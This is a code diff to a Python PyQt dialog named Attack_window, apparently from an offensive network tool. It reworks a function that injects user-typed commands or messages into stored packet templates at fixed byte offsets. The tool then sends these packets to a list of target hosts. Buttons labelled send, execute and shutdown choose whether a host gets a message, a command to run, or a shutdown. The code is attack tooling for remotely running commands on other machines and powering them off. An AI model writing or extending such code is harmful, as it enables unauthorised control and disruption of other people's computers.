@@ -348,10 +348,14 @@ class Attack_window(QtWidgets.QDialog):
             
         return target_hosts
 
-    def create_command_packet(self, command):
+    def create_packet(self, command, c):
         packet = base[1]
         command_bytes = self.format_message(command)
-        command_position = 578
+        if c==0:
+            command_position = 578
+        else:
+            packet = base[0]
+            command_position = 56
         for i, byte in enumerate(command_bytes):
             if command_position + i < len(packet):
                 packet[command_position + i] = byte
@@ -360,13 +364,11 @@ class Attack_window(QtWidgets.QDialog):
     def send_message(self):
         button = window.sender().text()
 
-        packet = self.create_command_packet(self.ui.textEdit_4.toPlainText())
+        packet = self.create_packet(self.ui.textEdit_4.toPlainText(), 0)
 
         port = int(self.ui.textEdit_2.toPlainText())
 
-        message_data = self.format_message(self.ui.textEdit_3.toPlainText())
-        
-        full_message = base[0] + message_data
+        message_data = self.create_packet(self.ui.textEdit_3.toPlainText(), 1)
 
         target_hosts = self.get_target_ips(self.ui.textEdit.toPlainText())
         
@@ -375,7 +377,7 @@ class Attack_window(QtWidgets.QDialog):
         for host in target_hosts:
             try:
                 if button == "发送":
-                    payload = pack(f"{len(full_message)}B", *full_message)
+                    payload = pack(f"{len(message_data)}B", *message_data)
                 elif button == "执行":
                     payload = pack(f"{len(packet)}B", *packet)
                 elif button == "关机":
